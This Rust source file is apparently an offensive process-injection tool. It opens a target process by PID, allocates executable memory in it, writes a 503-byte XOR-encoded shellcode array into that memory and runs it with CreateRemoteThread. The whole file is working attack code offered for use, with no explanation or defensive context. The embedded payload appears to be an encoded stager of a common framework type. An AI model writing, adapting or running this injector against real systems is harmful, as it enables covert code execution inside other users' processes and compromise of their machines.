use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, PROCESS_ALL_ACCESS};
use winapi::um::processthreadsapi::CreateRemoteThread;
use std::ptr;
use winapi::shared::minwindef::{DWORD, LPVOID};
use std::mem;



fn main() {
    unsafe {
        let pid: DWORD = std::env::args().nth(1).expect("Please provide a PID").parse().expect("Invalid PID");

        println!("Injecting to PID: {}", pid);

        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process_handle.is_null() {
            println!("Failed to open process.");
            return;
        }

        let shellcode: [u8; 503] = [
            0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xc6, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff,
            0xff, 0x48, 0xbb, 0x1d, 0xbe, 0xa2, 0x7b, 0x2b, 0x90, 0xe1, 0xec, 0x48, 0x31, 0x58, 0x27, 0x48,
            0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0xe1, 0xf6, 0x21, 0x9f, 0xdb, 0x78, 0x21, 0xec, 0x1d,
            0xbe, 0xe3, 0x2a, 0x6a, 0xc0, 0xb3, 0xbd, 0x4b, 0xf6, 0x93, 0xa9, 0x4e, 0xd8, 0x6a, 0xbe, 0x7d,
            0xf6, 0x29, 0x29, 0x33, 0xd8, 0x6a, 0xbe, 0x3d, 0xf6, 0x29, 0x09, 0x7b, 0xd8, 0xee, 0x5b, 0x57,
            0xf4, 0xef, 0x4a, 0xe2, 0xd8, 0xd0, 0x2c, 0xb1, 0x82, 0xc3, 0x07, 0x29, 0xbc, 0xc1, 0xad, 0xdc,
            0x77, 0xaf, 0x3a, 0x2a, 0x51, 0x03, 0x01, 0x4f, 0xff, 0xf3, 0x33, 0xa0, 0xc2, 0xc1, 0x67, 0x5f,
            0x82, 0xea, 0x7a, 0xfb, 0x1b, 0x61, 0x64, 0x1d, 0xbe, 0xa2, 0x33, 0xae, 0x50, 0x95, 0x8b, 0x55,
            0xbf, 0x72, 0x2b, 0xa0, 0xd8, 0xf9, 0xa8, 0x96, 0xfe, 0x82, 0x32, 0x2a, 0x40, 0x02, 0xba, 0x55,
            0x41, 0x6b, 0x3a, 0xa0, 0xa4, 0x69, 0xa4, 0x1c, 0x68, 0xef, 0x4a, 0xe2, 0xd8, 0xd0, 0x2c, 0xb1,
            0xff, 0x63, 0xb2, 0x26, 0xd1, 0xe0, 0x2d, 0x25, 0x5e, 0xd7, 0x8a, 0x67, 0x93, 0xad, 0xc8, 0x15,
            0xfb, 0x9b, 0xaa, 0x5e, 0x48, 0xb9, 0xa8, 0x96, 0xfe, 0x86, 0x32, 0x2a, 0x40, 0x87, 0xad, 0x96,
            0xb2, 0xea, 0x3f, 0xa0, 0xd0, 0xfd, 0xa5, 0x1c, 0x6e, 0xe3, 0xf0, 0x2f, 0x18, 0xa9, 0xed, 0xcd,
            0xff, 0xfa, 0x3a, 0x73, 0xce, 0xb8, 0xb6, 0x5c, 0xe6, 0xe3, 0x22, 0x6a, 0xca, 0xa9, 0x6f, 0xf1,
            0x9e, 0xe3, 0x29, 0xd4, 0x70, 0xb9, 0xad, 0x44, 0xe4, 0xea, 0xf0, 0x39, 0x79, 0xb6, 0x13, 0xe2,
            0x41, 0xff, 0x32, 0x95, 0xe7, 0x92, 0xde, 0x42, 0x8d, 0x90, 0x7b, 0x2b, 0xd1, 0xb7, 0xa5, 0x94,
            0x58, 0xea, 0xfa, 0xc7, 0x30, 0xe0, 0xec, 0x1d, 0xf7, 0x2b, 0x9e, 0x62, 0x2c, 0xe3, 0xec, 0x1c,
            0x05, 0xa8, 0x7b, 0x2b, 0x95, 0xa0, 0xb8, 0x54, 0x37, 0x46, 0x37, 0xa2, 0x61, 0xa0, 0x56, 0x51,
            0xc9, 0x84, 0x7c, 0xd4, 0x45, 0xad, 0x65, 0xf7, 0xd6, 0xa3, 0x7a, 0x2b, 0x90, 0xb8, 0xad, 0xa7,
            0x97, 0x22, 0x10, 0x2b, 0x6f, 0x34, 0xbc, 0x4d, 0xf3, 0x93, 0xb2, 0x66, 0xa1, 0x21, 0xa4, 0xe2,
            0x7e, 0xea, 0xf2, 0xe9, 0xd8, 0x1e, 0x2c, 0x55, 0x37, 0x63, 0x3a, 0x91, 0x7a, 0xee, 0x33, 0xfd,
            0x41, 0x77, 0x33, 0xa2, 0x57, 0x8b, 0xfc, 0x5c, 0xe6, 0xee, 0xf2, 0xc9, 0xd8, 0x68, 0x15, 0x5c,
            0x04, 0x3b, 0xde, 0x5f, 0xf1, 0x1e, 0x39, 0x55, 0x3f, 0x66, 0x3b, 0x29, 0x90, 0xe1, 0xa5, 0xa5,
            0xdd, 0xcf, 0x1f, 0x2b, 0x90, 0xe1, 0xec, 0x1d, 0xff, 0xf2, 0x3a, 0x7b, 0xd8, 0x68, 0x0e, 0x4a,
            0xe9, 0xf5, 0x36, 0x1a, 0x50, 0x8b, 0xe1, 0x44, 0xff, 0xf2, 0x99, 0xd7, 0xf6, 0x26, 0xa8, 0x39,
            0xea, 0xa3, 0x7a, 0x63, 0x1d, 0xa5, 0xc8, 0x05, 0x78, 0xa2, 0x13, 0x63, 0x19, 0x07, 0xba, 0x4d,
            0xff, 0xf2, 0x3a, 0x7b, 0xd1, 0xb1, 0xa5, 0xe2, 0x7e, 0xe3, 0x2b, 0x62, 0x6f, 0x29, 0xa1, 0x94,
            0x7f, 0xee, 0xf2, 0xea, 0xd1, 0x5b, 0x95, 0xd1, 0x81, 0x24, 0x84, 0xfe, 0xd8, 0xd0, 0x3e, 0x55,
            0x41, 0x68, 0xf0, 0x25, 0xd1, 0x5b, 0xe4, 0x9a, 0xa3, 0xc2, 0x84, 0xfe, 0x2b, 0x11, 0x59, 0xbf,
            0xe8, 0xe3, 0xc1, 0x8d, 0x05, 0x5c, 0x71, 0xe2, 0x6b, 0xea, 0xf8, 0xef, 0xb8, 0xdd, 0xea, 0x61,
            0xb4, 0x22, 0x80, 0xcb, 0xe5, 0xe4, 0x57, 0x5a, 0xad, 0xd0, 0x14, 0x41, 0x90, 0xb8, 0xad, 0x94,
            0x64, 0x5d, 0xae, 0x2b, 0x90, 0xe1, 0xec,
        ];

        let remote_buffer = VirtualAllocEx(process_handle, ptr::null_mut(), shellcode.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if remote_buffer.is_null() {
            println!("Failed to allocate memory in remote process.");
            CloseHandle(process_handle);
            return;
        }

        let mut old_protection: DWORD = 0;
        VirtualProtectEx(process_handle, remote_buffer, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protection);

        WriteProcessMemory(process_handle, remote_buffer, shellcode.as_ptr() as LPVOID, shellcode.len(), ptr::null_mut());

        let thread = CreateRemoteThread(process_handle, ptr::null_mut(), 0, Some(mem::transmute::<LPVOID, unsafe extern "system" fn(LPVOID) -> DWORD>(remote_buffer)), ptr::null_mut(), 0, ptr::null_mut());
        if thread.is_null() {
            println!("Failed to create remote thread.");
            CloseHandle(process_handle);
            return;
        }

        CloseHandle(process_handle);
    }
}